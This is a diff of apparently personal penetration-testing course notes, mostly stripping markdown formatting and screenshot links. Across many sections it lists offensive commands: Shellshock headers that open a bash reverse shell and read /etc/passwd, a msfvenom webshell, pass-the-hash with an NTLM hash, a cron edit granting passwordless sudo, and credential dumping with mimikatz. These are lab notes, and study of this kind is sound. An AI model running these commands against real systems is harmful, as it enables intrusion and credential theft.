@@ -25,7 +25,7 @@
 
 `whois <domain name>` - domain ownership information **(website version is also available)**
 
- [**netcraft.com**](http://netcraft.com) - all information about any website
+ [netcraft.com](http://netcraft.com) - all information about any website
 
 ### DNS RECON
 
@@ -37,9 +37,9 @@
 
 **WAF - Web Application Firewall**
 
-`wafw000f** <domain name>` - WAF recon utility, used for fingerprinting web firewalls.
+`wafw000f <domain name>` - WAF recon utility, used for fingerprinting web firewalls.
 
-`wafw00f** <domain> -a`  -  for all instances
+`wafw00f <domain> -a`  -  for all instances
 
 ### Subdomain Enumeration
 
@@ -50,15 +50,15 @@
 ### Google Dorks
 
 ```
-site:ine.com - every domain contains ine.com and we can have **subdomains** as well (my.ine.com)
-site:*.ine.com - gives fully and only **subdomains**
+site:ine.com - every domain contains ine.com and we can have subdomains as well (my.ine.com)
+site:*.ine.com - gives fully and only subdomains
 
 inurl:admin - contains "admin" in every url
 
 intitle:admin - contains "admin" in every title
 intitle:"index of" - directory misconfigurations (a type vulnerability)
 
-filetype:pdf - website contains files with they type of **pdf**
+filetype:pdf - website contains files with they type of pdf
 
 cache:ine.com - old (hours before) versions of website according to google
 
@@ -67,11 +67,11 @@ intext:admin - searches for the given word in the body of the text somewhere
 
 ### Email Harvesting (*subdomains*, IPs, as well)
 
-    `theHarvester -d <domain name>` - searches through a domain name for finding credentials 
+    `theHarvester -d <domain name>' - searches through a domain name for finding credentials 
 
 ### Leaked passwords
 
-[**haveibeenpwned.com](http://haveibeenpwned.com)**   - checking checking data breaches
+[haveibeenpwned.com](http://haveibeenpwned.com)   - checking checking data breaches
 
 ## Active Recon
 
@@ -123,33 +123,33 @@ Happens when admins transfer zone files from one DNS server to another one. If m
 
 ### NMAP
 
-`sudo **nmap** -sn <ip/24>` - host scanning, no ports (finding ***devices*** in the **LAN**)
+`sudo nmap -sn <ip/24>` - host scanning, no ports (finding ***devices*** in the **LAN**)
 
-`netdiscover`** - host discovering 
+`netdiscover` - host discovering 
 
 Example: `netdiscover -i eth0 -r <ip/24>`
 
-`sudo **nmap** -Pn -p 80, 443 <ip>` - specific port scanning (-p) (tcp) and skipping host scanning (-Pn)
+`sudo nmap -Pn -p 80, 443 <ip>` - specific port scanning (-p) (tcp) and skipping host scanning (-Pn)
 
 **filtered state** means it is protected by a **firewall** (and more likely closed)
 
 **default scanning** is **1000** most used ports and SYN **(-sS)** scanning with -**T3** for a root user
 
-`sudo nmap -Pn **-p1-65535** <ip>` - port range (all ports like -p-)
+`sudo nmap -Pn -p1-65535 <ip>` - port range (all ports like -p-)
 
 `sudo nmap **-F** <ip>` - **100** most used ports (-F  -  fast)
 
-UDP scanning - `nmap **-sU** <ip>`
+UDP scanning - `nmap -sU <ip>`
 
-**s**ervice **V**ersion - `nmap -**sV** <ip>`
+**s**ervice **V**ersion - `nmap -sV <ip>`
 
-Operating System - `nmap -**O** <ip>` (**not reliable**)
+Operating System - `nmap -O <ip>` (**not reliable**)
 
-What is happening in the background - (`nmap **-v**`) verbose
+What is happening in the background - (`nmap -v`) verbose
 
-finding more info with **sC**ripts - `nmap **-sC** <ip>`
+finding more info with **sC**ripts - `nmap -sC <ip>`
 
-***V**ersion, **O**perating system, s**c**ript scanning together (-sV -O -sC)* - `nmap **-A** <ip>`
+***V**ersion, **O**perating system, s**c**ript scanning together (-sV -O -sC)* - `nmap -A <ip>`
 
 **(-sC -sV -O) = (-A)**
 
@@ -157,15 +157,15 @@ finding more info with **sC**ripts - `nmap **-sC** <ip>`
 
 -T4 is ***preferred*** if the connection is fast, some ***accuracy errors*** can happen
 
-`sudo nmap -A **-T4** -p- <ip>` - script, version, OS scan with high speed and all ports
+`sudo nmap -A -T4 -p- <ip>` - script, version, OS scan with high speed and all ports
 
 -T4 (aggressive)
 
 **Saving results:** 
 
-`nmap -A -T4 -p- <ip> **-oN** results.txt` - (-oN) saves as a text file
+`nmap -A -T4 -p- <ip> -oN results.txt` - (-oN) saves as a text file
 
-`nmap -A -T4 -p- <ip> **-oX** results.xml` - (-oX) saves as a xml file, useful for metasploit
+`nmap -A -T4 -p- <ip> -oX results.xml` - (-oX) saves as a xml file, useful for metasploit
 
 # Footprinting and Scanning (Networking, NMAP) (Assess. Meth.)
 
@@ -185,7 +185,7 @@ finding more info with **sC**ripts - `nmap **-sC** <ip>`
 
 **O**pen **S**ystems **I**nterconnection - is a conceptual framework, standardizes the functions of networking into seven layers.
 
-![Screenshot 2024-07-21 at 18-26-26 INE-Assessment-Methodologies-Footprinting-and-Scanning-Course-File.pdf.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/5b559fd1-44a9-48a9-ace5-96e04c706280/f010e068-8fec-457c-80f6-b6bc7dd36da3/Screenshot_2024-07-21_at_18-26-26_INE-Assessment-Methodologies-Footprinting-and-Scanning-Course-File.pdf.png)
+
 
 1. Physical layer - deals with physical connection of devices (Ethernet, Fiber, USB)
 
@@ -227,27 +227,12 @@ Transport Layer **Protocols** include:
 
 1. **TCP** (Transmission Control Protocol) - is a connection-oriented protocol, requires accurate delivery of data across the network through the use of ***3-way handshake***:
     1. **3-way handshake** is an establishment of connection before delivering data.
-    
-    ![240722_02h49m53s_screenshot.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/5b559fd1-44a9-48a9-ace5-96e04c706280/542e6723-54ac-40b0-8ce8-db624464b445/240722_02h49m53s_screenshot.png)
-    
+
+
     1. Client sends SYN (Synchronize) (set) flag. Includes a initial sequence number.
     2. Server responds with SYN-ACK (Acknowledge). Includes its own initial sequence number.
     3. Client responds ACK.
         
-        
-         SYN
-        
-    
-     —————> Initiates a connection request
-    
-       SYN-ACK
-    
-    <————— Acknowledges the connection request (SYN), ACKs the received data (ACK)
-    
-
-             ACK
-
-        —————> No acknowledgment yet.
 
 b. **TCP Port numbers:**
 
@@ -279,9 +264,9 @@ Techniques:
 
 ### **2>/dev/null** - ignores errors
 
-1. Ping Sweep with **`fping`**:     **`fping -a -g <ip/24> 2>/dev/null`- (-a (alive), -g (subnet))**
+1. Ping Sweep with `fping`:     `fping -a -g <ip/24> 2>/dev/null`- (-a (alive), -g (subnet))**
     1. **NOTE: `ping` and `fping` are completely blocked by Windows Firewall , you must use *TCP SYN* SCAN**
-2. `nmap -sn -**iL** targets.txt` - **i**nput **F**ile name that contains ip addresses
+2. `nmap -sn -iL targets.txt` - **i**nput **F**ile name that contains ip addresses
     
     targets.txt: 192.168.1.0
     
@@ -289,19 +274,19 @@ Techniques:
     
     192.168.1.2-254 # range
     
-3. `nmap -sn **-PS** <ip/24>` - ping scanning with **TCP SYN (good against Windows hosts)**
+3. `nmap -sn -PS <ip/24>` - ping scanning with **TCP SYN (good against Windows hosts)**
     
-    `nmap -sn -PS**80, 443, 443-1000** <ip/24>` - with port range, **TCP SYN** Scan
+    `nmap -sn -PS80, 443, 443-1000 <ip/24>` - with port range, **TCP SYN** Scan
     
-4. `nmap -sn -**PA**80-443 <ip/24>` - **TCP ACK** scanning (not **preferred**)
-5. `nmap -sn -**PE** <ip/24>` - ICMP **Echo** request
-6. `nmap -sn -**PU** <ip/24>` - **UDP** ping scanning
+4. `nmap -sn -PA80-443 <ip/24>` - **TCP ACK** scanning (not **preferred**)
+5. `nmap -sn -PE <ip/24>` - ICMP **Echo** request
+6. `nmap -sn -PU <ip/24>` - **UDP** ping scanning
 
 ### Port Scanning
 
 **`-sS`** and **`-sT`** difference:
 
-`-**sS**` (SYN Stealth Scan) - used for discovering open ports. Sends **SYN** packet, then server responds with **SYN-ACK**, and client sends **RST** packet that it makes `-sS` stealthy 
+**`-sS`** (SYN Stealth Scan) - used for discovering open ports. Sends **SYN** packet, then server responds with **SYN-ACK**, and client sends **RST** packet that it makes `-sS` stealthy 
 
 **`-sT`** (TCP Connect Scan) - used for discovering open ports. Sends **SYN**, gets **SYN-ACK**, sends **ACK** again.
 
@@ -311,8 +296,8 @@ Techniques:
 
 ### Service Version and OS Scanning:
 
-1. `nmap -**sV** -**O** <ip>`
-2. `nmap -sV **—version-intensity <0-9>** -O **—osscan-guess** <ip>`  - Version intensity increases **aggressiveness** of service version detection, Osscan-guess guesses OS more **aggressively.**
+1. `nmap -sV -O <ip>`
+2. `nmap -sV —version-intensity <0-9> -O —osscan-guess <ip>`  - Version intensity increases **aggressiveness** of service version detection, Osscan-guess guesses OS more **aggressively.**
 
 ### NSE (NMAP Scripting Engine)
 
@@ -322,11 +307,11 @@ Directory for NSE: `ls /usr/share/nmap/scripts`
 
 For your wants: `ls /usr/share/nmap/scripts | grep brute` - scripts for brute force
 
-**—Information about scripts**: `nmap **—script-help**=mongodb-databases`
+**—Information about scripts**: `nmap —script-help=mongodb-databases`
 
 **—Using Scripts:** `nmap **—script**=http-form-brute**,**http-enum <ip>`  **(after comma without space)**
 
-Using **entire** scripts of a service with a wildcard: `nmap —script=**ftp-*** -p21 <ip>`
+Using **entire** scripts of a service with a wildcard: `nmap —script=ftp- -p21 <ip>`
 
 **—Script Arguments: `nmap —script=smb-enum-sessions —script-args smbusername=username,smbpassword=password`**
 
@@ -334,16 +319,16 @@ Using **entire** scripts of a service with a wildcard: `nmap —script=**ftp-***
 
 ### Firewall Detection & IDS Evasion in NMAP
 
-- **Firewall** Detection: `nmap -**sA** -p 3389 (RDP Port) <ip>` - we use ports that are associated with **Windows**
+- **Firewall** Detection: `nmap -sA -p 3389 (RDP Port) <ip>` - we use ports that are associated with **Windows**
     
     If it is protected by Firewall, then we’ll se **filtered** station, if it is not then it is **unfiltered.**
     
     **Note**: ***When we send ACK packet to a ports, that ports does not respond, it means port is **filtered**, if responds with RST, then port is **unfiltered**
     
-- **IDS** (Intrusion Detection System): `nmap **-f** **--mtu** 32 <ip>`
-    - **`-f**` means **fragmentation** (a packet is broken to smaller pieces, `—mtu` means **M**aximum **T**ransmission **U**nit refers to the highest value of a packet in bytes.
+- **IDS** (Intrusion Detection System): `nmap -f --mtu 32 <ip>`
+    - **`-f` means **fragmentation** (a packet is broken to smaller pieces, `—mtu` means **M**aximum **T**ransmission **U**nit refers to the highest value of a packet in bytes.
     - These fragmentation makes it **harder** to be detected by IDS/IPS
-- **Spoofing:** `nmap -f —data-length 200 **-D** 10.23.21.1,10.23.21.2 **-g** 53 <ip>` - We use a decoy ip address and a port to fool IDS/IPS
+- **Spoofing:** `nmap -f —data-length 200 -D 10.23.21.1,10.23.21.2 -g 53 <ip>` - We use a decoy ip address and a port to fool IDS/IPS
     
     `-D` as decoy, `-g` as a source port
     
@@ -389,16 +374,16 @@ File Explorer → Network → Map Network → \\<ip>\ → Browse
     - RCE (Remote Code Execution):`smbmap -u <user> -p <password> **-x <windows_command>** -H <target>` - (providing with a command **`-x`**) (`-x ipconfig`)
     - Listing drives with **`-L`**
     - Inside of Drive with **`-r <drive>`** - as an example, `-r c$`
-    - File Uploading: `smbmap -u <user> -p <password> -H <target> **—upload** /root/file c$/file`
-    - File Downloading: `smbmap -u <user> -p <password> -H <target> **—download** c$/file` (c$ - C: Drive)
-- **nmblookup:`nmblookup** -A <ip>` - querying NetBIOS names
+    - File Uploading: `smbmap -u <user> -p <password> -H <target> —upload /root/file c$/file`
+    - File Downloading: `smbmap -u <user> -p <password> -H <target> —download c$/file` (c$ - C: Drive)
+- **nmblookup:`nmblookup -A <ip>` - querying NetBIOS names
     - **SAMBA** is an open-source implementation of SMB
-- **rpcclient**: **`rpcclient** -U “” -N <ip>`  - (`-U` - username, `-N` - no password)
+- **rpcclient**: **`rpcclient -U “” -N <ip>`  - (`-U` - username, `-N` - no password)
     - After access, `srvinfo` - server info about SAMBA
     - `enumdomusers` - user list
     - `lookupnames <name>`
-- **smbclient**:**`smbclient** -L <ip> -N` - listing Shares, `-L`=lists by ip, `-N`=no password
-- **enum4linux**: **`enum4linux** -a <ip>` (`-a`- all simple enumeration)
+- **smbclient**:**`smbclient -L <ip> -N` - listing Shares, `-L`=lists by ip, `-N`=no password
+- **enum4linux**: **`enum4linux -a <ip>` (`-a`- all simple enumeration)
     - `enum4linux -U <ip>` - user list
     - `enum4linux -o <ip>` - OS information
 
@@ -418,7 +403,7 @@ Dictionary attack with Hydra:
 
 ## FTP (File Transfer Protocol)
 
-**`ftp** <ip>` - for accessing ftp server, then you enter a username and password
+**`ftp <ip>` - for accessing ftp server, then you enter a username and password
 
 - FTP password brute force with nmap: `nmap -p 21 —script=ftp-brute —script-args userdb=user.txt,passdb=pass.txt <target>`
 - If anonymous login is allowed: **username**=**anonymous**, **password**=”” (`-sC` gives it because of **`—ftp-anon`** script)
@@ -443,9 +428,9 @@ SSH Brute force with NMAP
 
 ## HTTP (HyperText Transfer Protocol)
 
-**`http** <ip or domain>` - Gives the page source and connection type, etc of a website (the tool is called **httpie**). 
+`http <ip or domain>` - Gives the page source and connection type, etc of a website (the tool is called **httpie**). 
 
-**`dirb** http://<ip> /usr/share/wordlists/…` - web content scanner (**directory** brute-forcing). dirb has its own default wordlist
+`dirb http://<ip> /usr/share/wordlists/…` - web content scanner (**directory** brute-forcing). dirb has its own default wordlist
 
 `browsh —startup-url http://<ip>` - CLI based websites
 
@@ -458,9 +443,9 @@ Nmap Scripts:
 - `nmap —script=http-methods —script-args=http-methods.url-path=/<directory> -p 80 <ip>` - Gives HTTP methods (GET, POST, etc) for a given **directory**
 - `nmap —script=http-webdav-scan —script-args=http-methods.url-path=/<directory> -p 80 <ip>` - detecting webdav
 
-**`wget** http://<ip>/index.html` - downloads the web page source
+`wget http://<ip>/index.html` - downloads the web page source
 
-**`curl** http://<ip>` - downloads the web page source
+`curl http://<ip>` - downloads the web page source
 
 ## MySQL
 
@@ -639,7 +624,7 @@ Systematic evaluation and examination of an organization’s information systems
 
 **Penetrating** testing **isn’t done** during an audit.
 
-*****Reporting** is the most important part of a penetration testing.
+**Reporting** is the most important part of a penetration testing.
 
 # System/Host based attacks (Host & Network Penetration Testing)
 
@@ -693,7 +678,7 @@ For connecting to a WebDAV server, we must provide credentials (username & passw
         - `delete webshell.asp` - we can delete after completing
 
 - **with** `msfconsole` and `msfvenom` (Metasploit)
-    - .asp payload - **`msfvenom** -p windows/meterpreter/reverse_tcp LHOST=<local ip> LPORT=1234 -f asp > shell.asp`
+    - .asp payload - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local ip> LPORT=1234 -f asp > shell.asp`
         - `cadaver <url>/webdav/`
             - `put /root/shell.asp`
                 - `service postgresql start && msfconsole -q` - database for a listener of metasploit
@@ -716,15 +701,14 @@ SMB have 2 layers of authentication:
 - User authentication: username & password for accessing a share
 - Share authentication: a **password** for accessing a restricted share
 
-![240802_17h37m09s_screenshot.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/5b559fd1-44a9-48a9-ace5-96e04c706280/ab21e406-fa30-4369-a24f-efbd9883f6ae/240802_17h37m09s_screenshot.png)
 
 **PsExec** is telnet-replacement lightweight tool by Microsoft. Used for interacting (arbitrary commands) with remote Windows hosts via **SMB (smb credentials needed)**
 
 **Exploitation** of SMB:
 
 - credentials gathering: **`smb_login`** in Metasploit or `hydra`
-- using PsExec: [`psexec.py`](http://psexec.py)- pyhton implementation of PsExec
-    - [`psexec.py](http://psexec.py) username@<ip>` - then we enter the **password** like in SSH, we get a command session
+- using PsExec: [`psexec.py`]- pyhton implementation of PsExec
+    - [`psexec.py] username@<ip>` - then we enter the **password** like in SSH, we get a command session
 - using PsExec in **Metasploit**: `smb/psexec` exploit module
 
 ### EternalBlue (MS17-010/CVE-2017-0144)
@@ -816,7 +800,7 @@ Windows Kernels are **Windows NT**, they have 2 main modes: User & Kernel.
     - `meterpreter > getprivs` - enables privileges for the current user
     - `meterpreter > getsystem` - automatically elevating **privileges**
     - `meterpreter > bg`
-    - `search **local_exploit_suggester**` - enumerating exploits on a target host
+    - `search local_exploit_suggester**` - enumerating exploits on a target host
         - `set session <number>` (setting the meterpreter session)
     - `use post/windows/…` (using any post-exploitation modules)
         - `set session <number>`
@@ -843,11 +827,7 @@ UAC has variety of integrity levels from **low to high**.
 
 1. If a **non-privileged** user tries to access a program that requires a privilege, he will face the **UAC credential prompt**:
     
-    ![uac-credential-prompt.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/5b559fd1-44a9-48a9-ace5-96e04c706280/5d57032b-3487-4bb6-b9ef-85c9fae95780/uac-credential-prompt.png)
-    
 2. If a **privileged** user (**administrator** or a user who is a part of the **local** administrators group) tries to access an app that requires a privilege, then he will face a **consent prompt:**
-    
-    ![uac-consent-prompt-admin.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/5b559fd1-44a9-48a9-ace5-96e04c706280/dd7c1155-cf6d-4805-9d22-9f4d628443df/uac-consent-prompt-admin.png)
     
 
 We can **bypass** UAC with having access to a user that is a part of the local administrators group. We will use **UACMe** from GitHub, it contains variuos methods for bypassing UAC, it abuses **AutoElevate** executables.
@@ -983,7 +963,7 @@ Commands on **Linux**:
 
 1. `meterpreter > download C:\Windows\Panther\unattend.xml`
 2. `echo ‘<password>’ | base64 -d`
-3. [`psexec.py](http://psexec.py) administrator@<ip>`, then the password from unattend.xml
+3. [`psexec.py] administrator@<ip>`, then the password from unattend.xml
 
 **Powershell**:
 
@@ -996,7 +976,7 @@ Commands on **Linux**:
 
 **Mimikatz** is a post-exploitation tool for extarcting **passwords** and their **hashes** from the memory (lsass.exe).
 
-Or we can use a meterpreter module (`meterpreter > load **kiwi**`) it is, actually, mimikatz
+Or we can use a meterpreter module (`meterpreter > load kiwi`) it is, actually, mimikatz
 
 **NOTE**:For this we must access to **lsass**.exe
 
@@ -1024,10 +1004,10 @@ It is an **exploitation** technique to **gather** and **use** NTLM hashes for au
 
 With: `crackmapexec`, `exploit/windows/smb/psexec`, and `evil-winrm` in metasploit
 
-- `meterpreter > **hashdump**` - gives LM and NTLM hashes of all users
+- `meterpreter > hashdump` - gives LM and NTLM hashes of all users
     - aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6 - ***LM:NTLM***
 - use `exploit/windows/smb/psexec`, `set RHOSTS, LHOST, SMBUser`
-    - `set **SMBPass <LM:NTLM>` - we can set this as a hash as well**
+    - `set SMBPass <LM:NTLM>` - we can set this as a hash as well
     - `set SMBPass aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6`
 
 OR
@@ -1060,7 +1040,7 @@ Apache servers are configured to run **CGI** (Common Gateway Interface) or .sh s
 - Using Burpsuite: Deleting User-Agent info
 - Using Burpsuite: User-Agent: () { :; }; echo; echo; /bin/bash -c ‘cat /etc/passwd’
 
-- **`rlwrap** nc -nlvp 1234`
+- `rlwrap nc -nlvp 1234`
 - Using Burpsuite: User-Agent: () { :; }; echo; echo; /bin/bash -c ‘bash -i>&/dev/tcp/<local_ip>/1234 0>&1’
 
 OR
@@ -1107,7 +1087,7 @@ smbclient is a part of SAMBA software suite, used for interaction with SAMBA.
 - **`/bin/bash -i`** - for a bash shell
 - `meterpreter > cd /tmp`
 - `meterpreter > upload linux-exploit-suggester.sh`, then `chmod +x linux-exploit-suggester.sh`
-- `search **suggester**` in `msfconsole`
+- `search suggester` in `msfconsole`
 
 ### Cron Job exploitation
 
@@ -1121,10 +1101,10 @@ If a cron job is run by the **root** user, and configured poorly (if we have an 
 
 - `crontab -l` - checking for cron jobs for the current user
     - ******* If we don’t find, it **doesn**’t mean that there is no cronjob file.
-- **`grep** -rnw /usr -e ‘/home/user/<cronjob_file>’ 2>/dev/null` - shows **files (inside of /usr)** that contains the **path** - `/home/user/<cronjob_fle>`
+- `grep -rnw /usr -e ‘/home/user/<cronjob_file>’ 2>/dev/null` - shows **files (inside of /usr)** that contains the **path** - `/home/user/<cronjob_fle>`
 - after finding a related script file like `/usr/local/share/copy.sh`, we see that it contains our cronjob_file.
     - if we have a write permission, we do:
-    **`printf** “#!/bin/bash\necho ‘student ALL=(ALL) NOPASSWD:ALL’ >> /etc/sudoers\n” > /usr/local/share/copy.sh` - if there is no **`nano`**
+ `printf “#!/bin/bash\necho ‘student ALL=(ALL) NOPASSWD:ALL’ >> /etc/sudoers\n” > /usr/local/share/copy.sh` - if there is no **`nano`**
 - `sudo -l` - we can access everything without any password
 
 ### SUID binary exploitation
@@ -1138,7 +1118,7 @@ For PrivEsc:
 
 - `file <file_suid>` - gives info about the file’s type
 - `strings <file_suid>` - printable characters inside of a file, especially for **non-text** files
-    - *** we don’t have permission to write <file_suid>, but we can execute it.
+    - we don’t have permission to write <file_suid>, but we can execute it.
     - we see that the `<file_suid>` have `setuid` and another `<another_file>` inside of it.
 - `mv <another_file> <random_name>`
 - `cp /bin/bash <another_file>`
@@ -1248,7 +1228,7 @@ Terminology:
 
 `sudo msfdb init`
 
-***`sudo msfdb reinit` - the second choice if we have errors
+`sudo msfdb reinit` - the second choice if we have errors
 
 `msfdb` - for commands
 
@@ -1302,7 +1282,7 @@ Terminology:
 
 ### **Importing**
 
-`nmap -sV -O -**oX** results.xml <ip>` - output as an XML file
+`nmap -sV -O -oX results.xml <ip>` - output as an XML file
 
 `msf6 > workspace -a nmap_1` - a new workspace
 
@@ -1314,7 +1294,7 @@ Terminology:
 
 `msf6 > workspace -a nmap_2`
 
-`msf6 > **db_nmap** -sV -O <ip>` - no need to output the results this time
+`msf6 > db_nmap -sV -O <ip>` - no need to output the results this time
 
 `msf6 > hosts`
 
@@ -1387,7 +1367,7 @@ Web server is used to serve website data.
     - `unsetg USERPASS_FILE`
 - `msf6 > use auxiliary/scanner/http/apache_userdir_enum`
 - `msf6 > use auxiliary/scanner/http/options` - gives headers (GET, POST, etc)
-- `msf6 > use auxiliary/scanner/http/**http_put**` - uploading file (if we have POST a header)
+- `msf6 > use auxiliary/scanner/http/http_put` - uploading file (if we have POST a header)
     - `msf6 > set PATH /<path>` - path for uploading
 
 ### MySQL DBMS
@@ -1427,7 +1407,7 @@ SMTP is used e-mail transmission. 25 is the default port. If it has a TLS (more 
 - `msf6 > info`
 - `searchsploit ‘Windows SMB’ | grep Metasploit` - gives Metasploit exploit modules for SMB
 
-- `msf6 > load **db_autopwn**` - From GitHub
+- `msf6 > load db_autopwn` - From GitHub
 - `msf6 > db_autopwn -p -t -PI 21` - ftp matching exploit modules (based on `msf6 > services` command)
 - `msf6 > analyze`
 
@@ -1616,7 +1596,6 @@ Haraka is a high performance SMTP server. Haraka versions prior (before) to v2.8
 
 Works differently on both OSs (windows, linux). On windows meterpreter has more features.
 
-![Screenshot from 2024-08-15 23-14-32.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/5b559fd1-44a9-48a9-ace5-96e04c706280/0e5ad2d0-89c2-4e4f-9af4-d7aaa0143128/Screenshot_from_2024-08-15_23-14-32.png)
 
 Post-exploitation also includes Local Enumeration, Dumping Hashes, Pivoting.
 
@@ -1628,7 +1607,7 @@ Post-exploitation also includes Local Enumeration, Dumping Hashes, Pivoting.
 - `meterpreter > ls`, `cd`, `cat`, `edit`
 - `meterpreter > checksum md5 /bin/bash` - getting md5 hash of a binary (command)
 - `meterpreter > getenv SHELL` - echo $SHELL
-- `meterpreter > search -d /usr/bin -f *backdoor*`
+- `meterpreter > search -d /usr/bin -f backdoor`
 - `meterpreter > shell` - cmd or bash
 - `meterpreter > ps` - processes
 - `meterpreter > migrate <ps.id>`
@@ -1770,20 +1749,20 @@ After compromising a target host, beginning to attack another host, whose intern
 
 *** WE will see another subnet or the same one again, but we cannot reach any of them (new subnet or the same one but with new ip)
 
-- `meterpreter > **run autoroute** -s <2nd-target>/20` or `24` (for Linux) - only applicable to the MSF
+- `meterpreter > run autoroute -s <2nd-target>/20` or `24` (for Linux) - only applicable to the MSF
 - `meterpreter > bg`
 - `msf6 > sessions -n victim-1 -i 1` - for naming
 - `msf6 > use portscan/tcp`
     - `msf6 > set RHOSTS <2nd-target>`
     - `<ip>:80` - we discover port 80 (for example absolutely)
-- `meterpreter > **portfwd add** -l 1080 -p 80 -r <2nd-target>`
+- `meterpreter > portfwd add -l 1080 -p 80 -r <2nd-target>`
 - `nmap -p1080 -sCV <local_ip>`
 - `msf6 > use exploit…`
     - `msf6 > set RHOSTS <2nd-target>`
     - `msf6 > set payload windows/meterpreter/bind_tcp`  - not reverse
     - `msf6 > set LPORT <lport>` - changing the local port because this is our second exploitation (the first one is used by our previous meterpreter session)
 
-- `meterpreter > search -d C:\\Users\\Administrator -f *flag***`
+- `meterpreter > search -d C:\\Users\\Administrator -f flag`
 
 ## Linux
 
@@ -1954,9 +1933,9 @@ Offline Exploit-db database
 - `cp /usr/share/windows-resources/binaries/nc.exe .`- we must host nc.exe for exploitation
 - `python3 -m http.server 80` - we must host nc.exe for exploitation
 - `nc -nlvp 1234`
-- `python3 [39161.py](http://39161.py) <target> 80` - downloads nc.exe from our web server, and we get a reverse shell.
+- `python3 [39161.py] <target> 80` - downloads nc.exe from our web server, and we get a reverse shell.
 
-***If it doesn’t work, then we must run the exploit file again until it works.
+If it doesn’t work, then we must run the exploit file again until it works.
 
 ### Compiling Exploits
 
@@ -2097,7 +2076,7 @@ Defacing the website: (changing)
 - `smbmap -H <ip> -u administrator -p <password>` - listing shares
 - `enum4linux -a -u administrator -p <password> <ip>` - listing all (`-a`)
 - `msf6 > use smb_enumusers`
-- `python3 [psexec.py](http://psexec.py) administrator@<ip>` or `msf6 > use smb/psexec` - gives cmd.exe
+- `python3 [psexec.py] administrator@<ip>` or `msf6 > use smb/psexec` - gives cmd.exe
 - `msf6 > use ms17_010_eternalblue`
 
 **MySQL**:
@@ -2218,7 +2197,6 @@ Methods will **differ** based on the target OS and privileges.
 
 Rules of engagement must be taken into consideration (can you clear the logs? can you change passwords? etc)
 
-![Screenshot from 2024-08-22 17-10-34.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/5b559fd1-44a9-48a9-ace5-96e04c706280/e244b3e9-aba7-4ae4-a9cf-90808265d24e/Screenshot_from_2024-08-22_17-10-34.png)
 
 ## Local Enumeration
 
